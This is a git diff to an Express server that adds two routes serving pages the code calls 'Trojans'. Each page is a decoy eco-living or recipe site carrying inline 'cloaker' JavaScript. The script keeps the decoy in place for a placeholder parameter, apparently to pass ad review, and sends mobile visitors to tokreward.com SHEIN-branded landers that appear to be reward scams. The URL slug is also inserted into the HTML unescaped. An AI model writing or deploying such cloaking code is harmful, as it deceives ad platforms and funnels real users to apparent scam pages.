@@ -17,6 +17,256 @@ app.use(express.static(path.join(__dirname, 'public')));
 // ALEXI 5.0
 
 // SHEIN BH FLUENT
+app.get('/9413/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=941`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}'s Eco-Friendly Living</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Lato', sans-serif;
+                    background-color: #e8f5e9;
+                    color: #2e7d32;
+                }
+                .container {
+                    max-width: 1000px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4caf50;
+                    color: white;
+                    text-align: center;
+                    padding: 2em;
+                    border-radius: 15px;
+                }
+                nav {
+                    background-color: #81c784;
+                    padding: 1em;
+                    border-radius: 15px;
+                    margin: 1em 0;
+                }
+                nav ul {
+                    list-style-type: none;
+                    padding: 0;
+                    display: flex;
+                    justify-content: space-around;
+                }
+                nav ul li a {
+                    color: white;
+                    text-decoration: none;
+                    font-weight: bold;
+                }
+                .content {
+                    background-color: white;
+                    padding: 2em;
+                    border-radius: 15px;
+                }
+                .eco-tips {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                    gap: 1em;
+                    margin-top: 2em;
+                }
+                .tip {
+                    background-color: #c8e6c9;
+                    border-radius: 10px;
+                    padding: 1em;
+                    text-align: center;
+                }
+                footer {
+                    text-align: center;
+                    margin-top: 2em;
+                    color: #1b5e20;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <header>
+                    <h1>${slug}'s Green Living Guide</h1>
+                </header>
+                <nav>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#tips">Eco Tips</a></li>
+                        <li><a href="#about">About Us</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </nav>
+                <main class="content">
+                    <h2>Welcome to ${slug}'s Sustainable Living Hub</h2>
+                    <p>Join us in our mission to create a greener, cleaner planet. Discover simple yet effective ways to reduce your carbon footprint and live in harmony with nature.</p>
+                    <div class="eco-tips">
+                        <div class="tip">
+                            <h3>Reduce Plastic</h3>
+                            <p>Switch to reusable bags and bottles</p>
+                        </div>
+                        <div class="tip">
+                            <h3>Save Energy</h3>
+                            <p>Use LED bulbs and unplug devices</p>
+                        </div>
+                        <div class="tip">
+                            <h3>Eat Local</h3>
+                            <p>Support local farmers and reduce food miles</p>
+                        </div>
+                        <div class="tip">
+                            <h3>Recycle Right</h3>
+                            <p>Learn proper recycling techniques</p>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Join the green revolution with ${slug} &copy; 2024 ${slug}'s Green Living Guide | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 941 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94812/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Culinary Adventures</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #f5f5f5;
+                    color: #333;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #ff6b6b;
+                    color: white;
+                    text-align: center;
+                    padding: 2em;
+                    border-radius: 10px 10px 0 0;
+                }
+                .menu {
+                    display: flex;
+                    justify-content: space-around;
+                    background-color: #4ecdc4;
+                    padding: 1em;
+                }
+                .menu a {
+                    color: white;
+                    text-decoration: none;
+                    font-weight: bold;
+                }
+                .content {
+                    background-color: white;
+                    padding: 2em;
+                    border-radius: 0 0 10px 10px;
+                }
+                .recipe-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .recipe-card {
+                    background-color: #ffe66d;
+                    border-radius: 10px;
+                    padding: 1em;
+                    text-align: center;
+                }
+                footer {
+                    text-align: center;
+                    margin-top: 2em;
+                    color: #666;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="wrapper">
+                <header>
+                    <h1>${slug}'s Gourmet Galaxy</h1>
+                </header>
+                <nav class="menu">
+                    <a href="#home">Home</a>
+                    <a href="#recipes">Recipes</a>
+                    <a href="#about">About Us</a>
+                    <a href="#contact">Contact</a>
+                </nav>
+                <main class="content">
+                    <h2>Welcome to ${slug}'s Culinary Universe</h2>
+                    <p>Embark on a gastronomic journey with ${slug}'s Gourmet Galaxy. We bring you flavors from across the cosmos, right to your kitchen!</p>
+                    <div class="recipe-grid">
+                        <div class="recipe-card">
+                            <h3>Nebula Noodles</h3>
+                            <p>A swirling galaxy of flavors in every bite</p>
+                        </div>
+                        <div class="recipe-card">
+                            <h3>Supernova Sushi</h3>
+                            <p>Explosive tastes that will light up your palate</p>
+                        </div>
+                        <div class="recipe-card">
+                            <h3>Meteor Meatballs</h3>
+                            <p>Out-of-this-world savory sensations</p>
+                        </div>
+                        <div class="recipe-card">
+                            <h3>Cosmic Cupcakes</h3>
+                            <p>Sweet treats from the far reaches of space</p>
+                        </div>
+                    </div>
+                </main>
+                <footer>
+                    <p>Explore the culinary cosmos with ${slug} &copy; 2024 ${slug}'s Gourmet Galaxy | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+                </footer>
+            </div>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/94712/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=947`;
